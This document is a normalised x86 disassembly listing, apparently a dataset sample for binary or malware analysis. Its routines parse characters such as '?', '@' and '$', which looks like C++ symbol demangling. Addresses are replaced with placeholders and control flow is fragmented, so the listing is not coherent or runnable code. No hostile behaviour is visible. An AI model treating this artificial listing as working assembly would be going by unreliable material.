inc [ rwxdata ]
cmp al 0x5f
jne r-xdata
inc [ rwxdata ]
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_415fd3
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_415fd3
mov eax [ rwxdata ]
mov cl [ eax ]
add esp 0x10
test cl cl
je r-xdata
mov ecx [ ebp + 0x8 ]
dec eax
push 0x1
mov [ rwxdata ] eax
call sub_41548d
mov eax [ ebp + 0x8 ]
leave
retn
cmp cl 0x40
je r-xdata
cmp [ eax ] 0x0
jne r-xdata
inc eax
mov [ rwxdata ] eax
mov cl [ eax ]
test cl cl
jne r-xdata
mov ecx [ ebp - 0x8 ]
inc eax
mov [ rwxdata ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn
sub_4169be
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rwxdata ]
mov al [ eax ]
test al al
jne r-xdata
push 0x0
cmp al 0x3f
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_41548d
jmp r-xdata
push [ ebp + 0x8 ]
call sub_415fd3
pop ecx
pop ecx
inc [ rwxdata ]
lea eax [ ebp - 0x8 ]
push eax
call sub_415fd3
push eax
push 0x2d
push [ ebp + 0x8 ]
call sub_415f1f
add esp 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
leave
retn
sub_416a10
mov edi edi
push ebp
mov ebp esp
sub esp 0xc8
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rwxdata ]
push ebx
mov bl [ eax ]
inc [ rwxdata ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movsx edi bl
cmp edi 0x44
jg r-xdata
cmp edi 0x45
je r-xdata
je r-xdata
push esi
call sub_4188f4
jle r-xdata
lea eax [ ebp - 0x80 ]
push eax
call sub_4169be
test [ rwxdata ] 0x4000
pop ecx
je r-xdata
sub edi 0x0
je r-xdata
and [ esi + 0x4 ] 0xffff00ff
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x2
jmp r-xdata
cmp edi 0x4a
jle r-xdata
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x88 ]
lea ecx [ ebp - 0xc ]
push eax
cmp bl 0x44
jne r-xdata
push 0x10
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x80 ]
call sub_4154d2
lea eax [ ebp - 0x14 ]
push eax
call sub_41b6bf
push eax
call [ rwxdata ]
pop ecx
pop ecx
test eax eax
je r-xdata
dec [ rwxdata ]
sub edi 0x30
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_405894
leave
retn
push 0x7b
lea ecx [ ebp - 0x80 ]
call sub_415852
cmp bl 0x48
jl r-xdata
cmp edi 0x51
je r-xdata
push r--data
jmp r-xdata
push r--data
push eax
jmp r-xdata
push esi
call sub_4169be
jmp r-xdata
dec edi
je r-xdata
sub edi 0x46
je r-xdata
cmp bl 0x4a
jg r-xdata
cmp edi 0x52
jne r-xdata
call sub_41587f
mov ecx eax
call sub_415cc7
push r--data
push esi
lea ecx [ ebp - 0x88 ]
call sub_415faf
jmp r-xdata
mov ecx esi
call sub_41587f
jmp r-xdata
pop ecx
mov eax [ rwxdata ]
cmp [ eax ] 0x40
jne r-xdata
dec edi
jne r-xdata
lea eax [ ebp - 0xa8 ]
push eax
call sub_4169be
pop ecx
push eax
lea ecx [ ebp - 0x80 ]
call sub_415aa8
push 0x2c
lea ecx [ ebp - 0x80 ]
call sub_415d0f
dec edi
je r-xdata
lea eax [ ebp - 0xb0 ]
push eax
call sub_4188f4
pop ecx
push eax
lea ecx [ ebp - 0x80 ]
call sub_415aa8
push 0x2c
lea ecx [ ebp - 0x80 ]
call sub_415d0f
push 0x0
lea eax [ ebp - 0x88 ]
push 0x0
push eax
call sub_41773a
lea eax [ ebp - 0x80 ]
push eax
call sub_4169be
mov eax [ ebp - 0x88 ]
mov [ esi ] eax
mov eax [ ebp - 0x84 ]
add esp 0x10
mov [ esi + 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0xc8 ]
push eax
call sub_4188f4
pop ecx
push eax
push esi
push r--data
lea ecx [ ebp - 0x90 ]
call sub_41587f
jmp r-xdata
inc [ rwxdata ]
push r--data
lea eax [ ebp - 0x80 ]
push eax
call sub_4169be
lea eax [ ebp - 0x88 ]
push eax
call sub_4169be
cmp [ ebp - 0x7c ] 0x1
pop ecx
pop ecx
jg r-xdata
lea eax [ ebp - 0x98 ]
push eax
call sub_4169be
pop ecx
push eax
lea ecx [ ebp - 0x80 ]
call sub_415aa8
push 0x2c
lea ecx [ ebp - 0x80 ]
call sub_415d0f
dec edi
je r-xdata
mov ecx eax
call sub_415cc7
jmp r-xdata
push 0x1
mov ecx esi
call sub_41548d
jmp r-xdata
cmp [ ebp - 0x84 ] 0x1
jg r-xdata
lea eax [ ebp - 0xb8 ]
push eax
call sub_4169be
pop ecx
push eax
lea ecx [ ebp - 0x80 ]
call sub_415aa8
dec edi
je r-xdata
push 0x64
lea eax [ ebp - 0x77 ]
push eax
lea ecx [ ebp - 0x80 ]
call sub_4154d2
test eax eax
jne r-xdata
dec edi
jne r-xdata
mov al [ ebp - 0x77 ]
mov [ ebp - 0x78 ] al
cmp al 0x2d
jne r-xdata
push 0x7d
push esi
lea ecx [ ebp - 0x80 ]
call sub_415f8b
jmp r-xdata
mov [ ebp - 0x77 ] 0x2e
mov al [ ebp - 0x76 ]
mov [ ebp - 0x77 ] al
mov [ ebp - 0x76 ] 0x2e
jmp r-xdata
lea eax [ ebp - 0x88 ]
push eax
push esi
push 0x65
lea eax [ ebp - 0xa0 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea ecx [ ebp - 0xc0 ]
call sub_41587f
mov ecx eax
call sub_415f8b
sub_416d00
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
xor ecx ecx
sub esp 0x18
cmp [ eax ] cl
je r-xdata
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_415f43
cmp [ ebp + 0x10 ] ecx
je r-xdata
cmp [ eax ] 0x59
jne r-xdata
cmp [ eax ] 0x58
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
lea eax [ ebp - 0x8 ]
push esi
push eax
call sub_419b61
mov eax [ esi + 0x4 ]
pop ecx
pop ecx
pop esi
test eax 0x4000
je r-xdata
push [ ebp + 0xc ]
inc eax
push [ ebp + 0x8 ]
mov [ rwxdata ] eax
call sub_416537
pop ecx
pop ecx
jmp r-xdata
inc eax
mov [ rwxdata ] eax
mov eax [ ebp + 0xc ]
cmp [ eax ] ecx
jne r-xdata
test eax 0x2000
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push r--data
mov eax [ ebp + 0x8 ]
leave
retn
push eax
push r--data
push [ ebp + 0x8 ]
call sub_415f67
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push r--data
call sub_41587f
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push r--data
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
leave
retn
add esp 0xc
lea ecx [ ebp - 0x18 ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
jmp r-xdata
sub_416dfe
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi + 0x4 ] bl
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] ebx
mov [ rwxdata ] 0x1
mov [ ebp - 0x20 ] 0x1
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
pop esi
mov [ rwxdata ] bl
xor ecx ebp
pop ebx
call sub_405894
leave
retn
push edi
mov edi 0xffff0000
pop edi
cmp cl 0x40
je r-xdata
cmp [ ebp - 0x20 ] ebx
je r-xdata
push 0x2c
mov ecx esi
call sub_415d0f
mov eax [ rwxdata ]
mov [ ebp - 0x20 ] ebx
jmp r-xdata
and [ ebp - 0x18 ] edi
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x1c ] ebx
cmp dl 0x58
jne r-xdata
inc eax
mov [ rwxdata ] eax
push ecx
mov ecx [ rwxdata ]
lea eax [ ebp - 0x74 ]
push eax
call sub_415647
jmp r-xdata
mov dl [ eax ]
movsx ecx dl
sub ecx 0x30
cmp ecx 0x9
ja r-xdata
cmp dl 0x24
jne r-xdata
inc eax
mov [ rwxdata ] eax
push r--data
push eax
mov ecx esi
call sub_415aa8
cmp [ esi + 0x4 ] bl
je r-xdata
cmp dl 0x3f
jne r-xdata
inc eax
cmp [ eax ] dl
je r-xdata
mov eax [ rwxdata ]
sub eax [ ebp - 0x44 ]
cmp eax 0x1
jle r-xdata
mov eax [ rwxdata ]
mov cl [ eax ]
cmp cl bl
je r-xdata
and [ ebp - 0x3c ] edi
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x6c ]
push eax
mov [ ebp - 0x40 ] ebx
call sub_419f24
pop ecx
lea eax [ ebp - 0x38 ]
push eax
call sub_4169be
test [ rwxdata ] 0x4000
pop ecx
je r-xdata
mov [ rwxdata ] eax
lea eax [ ebp - 0x7c ]
push eax
call sub_416a10
jmp r-xdata
lea eax [ ebp - 0x1c ]
mov ecx [ rwxdata ]
cmp [ ecx ] 0x9
je r-xdata
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push r--data
lea ecx [ ebp - 0x64 ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x54 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x50 ]
push r--data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x2c ] eax
call sub_415d61
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x2c ]
jmp r-xdata
push 0x10
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x38 ]
call sub_4154d2
lea eax [ ebp - 0x14 ]
push eax
call sub_41b6bf
push eax
call [ rwxdata ]
pop ecx
pop ecx
cmp eax ebx
je r-xdata
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x1c ] ecx
lea eax [ ebp - 0x1c ]
push eax
call sub_4155fd
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push r--data
lea ecx [ ebp - 0x5c ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x48 ]
push r--data
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x24 ] eax
call sub_415d61
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x24 ]
jmp r-xdata
push eax
jmp r-xdata
lea ecx [ ebp - 0x1c ]
call sub_415b7f
jmp r-xdata
sub_41700d
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rwxdata ]
movsx edx [ eax ]
push ebx
xor ebx ebx
mov ecx 0xffff0000
and [ ebp - 0x4 ] ecx
and [ ebp - 0xc ] ecx
push esi
xor esi esi
inc eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ rwxdata ] eax
cmp edx 0x41
jg r-xdata
cmp edx 0x42
je r-xdata
je r-xdata
xor esi esi
inc esi
jle r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
lea ecx [ ebp - 0x8 ]
call sub_415b7f
cmp esi ebx
je r-xdata
cmp edx ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
mov [ eax + 0x4 ] 0x2
mov [ eax ] ebx
jmp r-xdata
cmp edx 0x5a
jle r-xdata
dec eax
mov [ rwxdata ] eax
cmp edx 0x2f
jle r-xdata
mov ecx [ ebp - 0x8 ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push r--data
lea ecx [ ebp - 0x30 ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0x200
jmp r-xdata
pop esi
pop ebx
leave
retn
cmp edx 0x5f
jne r-xdata
cmp edx 0x31
jle r-xdata
movsx ecx [ eax ]
inc eax
mov [ rwxdata ] eax
cmp ecx 0x4f
jg r-xdata
and [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0xc ] bl
je r-xdata
cmp edx 0x39
jg r-xdata
cmp ecx 0x54
jg r-xdata
cmp ecx 0x44
jge r-xdata
push ebx
mov esi eax
lea eax [ ebp - 0x90 ]
push ebx
push eax
call sub_41773a
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
add esp 0xc
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov [ rwxdata ] esi
cmp ecx ebx
je r-xdata
lea eax [ ebp - 0x88 ]
push eax
call sub_416dfe
pop ecx
push eax
lea eax [ ebp - 0x28 ]
push eax
push 0x3c
lea ecx [ ebp - 0x20 ]
call sub_415852
mov ecx eax
call sub_415cc7
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_415aa8
mov ecx [ ebp - 0x10 ]
cmp ecx ebx
je r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
cmp ecx 0x55
jl r-xdata
cmp ecx 0x53
jge r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
jmp r-xdata
cmp ecx 0x39
jg r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp [ esi - 0x1 ] 0x31
jne r-xdata
push 0x3e
lea ecx [ ebp - 0x10 ]
call sub_415d0f
mov eax [ ebp + 0x10 ]
cmp eax ebx
je r-xdata
mov eax [ ecx ]
call [ eax + 0x4 ]
cmp al 0x3e
jne r-xdata
cmp ecx 0x56
jle r-xdata
sub ecx 0x50
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_41587f
jmp r-xdata
cmp ecx 0x3f
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_415aa8
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x7e
lea ecx [ ebp - 0x28 ]
call sub_415852
mov ecx eax
call sub_415cc7
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ rwxdata ]
cmp [ eax ] bl
jne r-xdata
mov [ eax ] 0x1
push 0x20
lea ecx [ ebp - 0x10 ]
call sub_415d0f
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
jmp r-xdata
cmp ecx 0x57
jle r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
lea ecx [ ebp - 0x8 ]
call sub_415b7f
push ebx
lea eax [ ebp - 0x70 ]
push ebx
push eax
call sub_41700d
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
add esp 0xc
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
cmp ecx ebx
je r-xdata
dec ecx
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
movsx ecx [ eax ]
inc eax
mov [ rwxdata ] eax
cmp ecx ebx
je r-xdata
cmp ecx 0x40
jle r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
lea ecx [ ebp - 0x20 ]
call sub_41587f
mov ecx [ ebp - 0x1c ]
or ecx 0x8000
cmp ecx ebx
je r-xdata
inc eax
mov [ rwxdata ] eax
mov ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0xc ]
jmp r-xdata
lea ecx [ ebp - 0x8 ]
call sub_415b7f
cmp ecx 0x59
jle r-xdata
lea ecx [ ebp - 0x8 ]
test eax 0x400
je r-xdata
dec ecx
jne r-xdata
cmp ecx 0x30
jne r-xdata
cmp ecx 0x42
jle r-xdata
mov [ eax + 0x4 ] ecx
cmp ecx 0x2f
jle r-xdata
cmp ecx 0x5f
jne r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
lea ecx [ ebp - 0x8 ]
call sub_415b7f
mov eax [ rwxdata ]
mov al [ eax ]
cmp al bl
jne r-xdata
push ebx
push r--data
jmp r-xdata
cmp ecx 0x43
jne r-xdata
cmp ecx 0x36
jle r-xdata
movsx ecx [ eax ]
inc eax
mov [ rwxdata ] eax
cmp ecx 0x41
jl r-xdata
movsx eax al
sub eax 0x30
js r-xdata
push 0x1
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x8 ]
call sub_415a84
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
call sub_41690b
mov ecx [ ebp - 0x1c ]
add esp 0xc
or ecx 0x1000
jmp r-xdata
push 0x1
push r--data
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
jmp r-xdata
cmp ecx 0x38
jg r-xdata
cmp ecx 0x44
jle r-xdata
cmp eax 0x5
jae r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
jmp r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
jmp r-xdata
cmp ecx 0x46
jle r-xdata
push [ eax * 4 + r--data ]
lea ecx [ ebp - 0x10 ]
call sub_415b7f
mov eax [ rwxdata ]
movsx eax [ eax ]
inc [ rwxdata ]
cmp eax 0x30
je r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
lea ecx [ ebp - 0x18 ]
call sub_41587f
mov eax [ rwxdata ]
cmp [ eax ] 0x3f
jne r-xdata
cmp ecx 0x4a
jg r-xdata
lea eax [ ebp - 0x28 ]
push ebx
push eax
call sub_41a0d5
mov eax [ ebp - 0x28 ]
pop ecx
pop ecx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x24 ]
push 0x20
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
call sub_415d0f
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_415aa8
lea ecx [ ebp - 0x20 ]
jmp r-xdata
cmp eax 0x31
je r-xdata
lea eax [ ebp - 0x30 ]
push eax
call sub_417b54
pop ecx
push eax
lea ecx [ ebp - 0x18 ]
call sub_415aa8
lea eax [ ebp - 0x80 ]
push eax
call sub_4188f4
pop ecx
push eax
lea ecx [ ebp - 0x18 ]
call sub_415aa8
mov eax [ rwxdata ]
cmp [ eax ] 0x40
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_415cc7
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x18 ]
call sub_415aa8
push 0x2c
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call sub_4169be
pop ecx
mov ecx eax
call sub_415f8b
push eax
lea ecx [ ebp - 0x18 ]
call sub_415aa8
push 0x2c
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
call sub_4169be
pop ecx
mov ecx eax
call sub_415f8b
push eax
lea ecx [ ebp - 0x18 ]
call sub_415aa8
push 0x2c
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_4169be
pop ecx
mov ecx eax
call sub_415f8b
push eax
lea ecx [ ebp - 0x18 ]
call sub_415aa8
push 0x29
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x60 ]
push ebx
push eax
call sub_415fd3
pop ecx
pop ecx
mov ecx eax
call sub_415f8b
push eax
lea ecx [ ebp - 0x18 ]
call sub_415aa8
push 0x27
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
call sub_415f8b
jmp r-xdata
add eax 0xffffffce
cmp eax 0x2
jbe r-xdata
push r--data
lea ecx [ ebp - 0x18 ]
call sub_415d61
mov ecx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x14 ]
jmp r-xdata
inc [ rwxdata ]
jmp r-xdata
dec [ rwxdata ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_41548d
sub_4175e3
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
sub esp 0xa8
cmp [ eax ] 0x3f
jne r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
leave
retn
cmp [ eax + 0x1 ] 0x24
jne r-xdata
or [ ebp - 0x50 ] 0xffffffff
or [ ebp - 0x7c ] 0xffffffff
or [ ebp - 0xa8 ] 0xffffffff
push ebx
mov ebx [ rwxdata ]
push esi
mov esi [ rwxdata ]
lea ecx [ ebp - 0x50 ]
mov [ rwxdata ] ecx
lea ecx [ ebp - 0x7c ]
push edi
mov edi [ rwxdata ]
mov [ rwxdata ] ecx
add eax 0x2
lea ecx [ ebp - 0xa8 ]
mov [ rwxdata ] eax
mov [ rwxdata ] ecx
cmp [ eax ] 0x3f
mov [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_41773a
inc eax
mov [ rwxdata ] eax
lea eax [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_41700d
jmp r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov [ rwxdata ] 0x1
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
add esp 0xc
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] ecx
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ rwxdata ] edi
pop edi
mov [ rwxdata ] esi
mov [ eax ] ecx
mov ecx [ ebp - 0x8 ]
pop esi
mov [ rwxdata ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn
lea eax [ ebp - 0x1c ]
push eax
call sub_416dfe
pop ecx
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x3c
lea ecx [ ebp - 0x24 ]
call sub_415852
mov ecx eax
call sub_415cc7
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_415aa8
mov ecx [ ebp - 0xc ]
test ecx ecx
je r-xdata
push 0x3e
lea ecx [ ebp - 0xc ]
call sub_415d0f
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ecx ]
call [ eax + 0x4 ]
cmp al 0x3e
jne r-xdata
mov eax [ rwxdata ]
cmp [ eax ] 0x0
je r-xdata
push 0x20
lea ecx [ ebp - 0xc ]
call sub_415d0f
inc [ rwxdata ]
sub_41773a
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ rwxdata ]
mov cl [ ebx ]
movsx eax cl
push esi
mov esi [ ebp + 0x8 ]
sub eax 0x30
mov [ ebp - 0x38 ] esi
cmp eax 0x9
ja r-xdata
and [ ebp - 0x1c ] 0x0
push edi
mov edi 0xffff0000
and [ ebp - 0x18 ] edi
cmp cl 0x3f
jne r-xdata
mov ecx [ rwxdata ]
push eax
inc ebx
push esi
mov [ rwxdata ] ebx
call sub_415647
mov eax esi
jmp r-xdata
mov eax r--data
mov esi eax
mov ecx ebx
mov [ ebp - 0x20 ] 0x12
lea eax [ ebp - 0x2c ]
push 0x0
push eax
call sub_4175e3
pop ecx
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x18 ] eax
mov eax [ rwxdata ]
mov [ ebp - 0x1c ] ecx
mov cl [ eax ]
inc eax
mov [ rwxdata ] eax
cmp cl 0x40
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_405894
leave
retn
movzx ecx [ ecx ]
movzx edx [ esi ]
sub ecx edx
jne r-xdata
cmp dl [ esi ]
jne r-xdata
cmp [ ebp + 0xc ] 0x0
pop edi
je r-xdata
dec eax
xor ecx ecx
mov [ rwxdata ] eax
cmp [ eax ] cl
setne cl
inc ecx
push ecx
lea ecx [ ebp - 0x1c ]
call sub_4155c6
jmp r-xdata
mov eax r--data
push 0xc
mov ecx ebx
mov esi eax
pop ebx
add ebx 0x13
mov [ rwxdata ] ebx
jmp r-xdata
inc ecx
inc esi
dec [ ebp - 0x20 ]
jne r-xdata
mov ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x38 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x18 ]
mov [ eax + 0x4 ] ecx
mov ecx [ rwxdata ]
cmp [ ecx ] 0x9
je r-xdata
movzx ecx [ ecx ]
movzx edx [ esi ]
sub ecx edx
jne r-xdata
cmp dl [ esi ]
jne r-xdata
mov esi eax
lea eax [ ebp - 0x24 ]
push eax
call sub_4169be
test [ rwxdata ] 0x4000
pop ecx
je r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
call sub_4155fd
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add [ rwxdata ] 0xd
inc ecx
inc esi
dec ebx
jne r-xdata
lea ecx [ ebp - 0x1c ]
push 0x10
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x24 ]
call sub_4154d2
lea eax [ ebp - 0x14 ]
push eax
call sub_41b6bf
push eax
call [ rwxdata ]
pop ecx
pop ecx
lea ecx [ ebp - 0x1c ]
test eax eax
je r-xdata
push 0x40
push rwxdata
lea ecx [ ebp - 0x34 ]
call sub_4158bc
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
mov eax [ rwxdata ]
cmp [ eax ] 0x40
jne r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
push r--data
call sub_415b7f
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
push esi
lea ecx [ ebp - 0x34 ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x28 ]
push r--data
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
call sub_415d61
lea eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp - 0x1c ]
call sub_415aa8
jmp r-xdata
push eax
call sub_415b7f
jmp r-xdata
mov ecx [ ebp - 0x30 ]
xor eax eax
and ecx edi
inc [ rwxdata ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] ecx
jmp r-xdata
sub_417950
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor ebx ebx
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
mov [ esi + 0x4 ] bl
mov edi 0xffff00ff
and [ esi + 0x4 ] edi
push eax
mov [ esi ] ebx
call sub_41773a
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
add esp 0xc
mov [ esi + 0x4 ] eax
cmp al bl
jne r-xdata
mov eax [ rwxdata ]
mov al [ eax ]
cmp al 0x40
jne r-xdata
mov eax [ rwxdata ]
mov al [ eax ]
cmp al bl
je r-xdata
cmp al bl
je r-xdata
inc [ rwxdata ]
jmp r-xdata
cmp al 0x40
je r-xdata
cmp [ esi ] ebx
jne r-xdata
and [ esi + 0x4 ] edi
mov [ esi + 0x4 ] 0x2
mov [ esi ] ebx
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn
push esi
lea eax [ ebp - 0x8 ]
push eax
push r--data
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_418b62
pop ecx
mov ecx eax
call sub_415faf
mov ecx eax
call sub_415cc7
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
push esi
lea eax [ ebp - 0x18 ]
push eax
push r--data
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_41548d
mov ecx eax
call sub_415faf
mov ecx eax
call sub_415cc7
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
push 0x1
mov ecx esi
call sub_4155c6
jmp r-xdata
sub_417a44
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
